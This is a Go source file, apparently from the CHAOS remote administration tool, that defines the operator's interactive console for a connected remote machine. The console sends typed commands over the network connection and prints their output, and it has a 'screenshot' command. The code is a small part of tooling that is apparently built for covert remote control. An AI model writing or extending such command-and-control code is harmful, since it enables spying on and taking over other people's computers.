package client

import (
	"fmt"
	"github.com/c-bata/go-prompt"
	"github.com/tiagorlampert/CHAOS/internal/handler"
	"github.com/tiagorlampert/CHAOS/internal/ui/completer"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/network"
	"github.com/tiagorlampert/CHAOS/pkg/system"
	"net"
	"strings"
)

type ClientHandler struct {
	Connection net.Conn
	UseCase    *usecase.UseCase
}

func NewClientHandler(conn net.Conn, useCase *usecase.UseCase) handler.Client {
	return &ClientHandler{
		Connection: conn,
		UseCase:    useCase,
	}
}

func (c ClientHandler) HandleConnection(hostname, user string) {
	p := prompt.New(
		c.executor,
		completer.ClientCompleter,
		prompt.OptionPrefix(fmt.Sprintf("%s@%s > ", hostname, user)),
		prompt.OptionPrefixTextColor(prompt.Yellow),
	)
	p.Run()
}

func (c ClientHandler) executor(input string) {
	values := strings.Fields(input)
	for _, v := range values {
		switch strings.TrimSpace(v) {
		case "screenshot":
			c.UseCase.Screenshot.TakeScreenshot(input)
			return
		case "exit":
			system.QuitApp()
		default:
			response, _ := network.SendCommand(c.Connection, input)
			fmt.Println(string(response))
			return
		}
	}
}
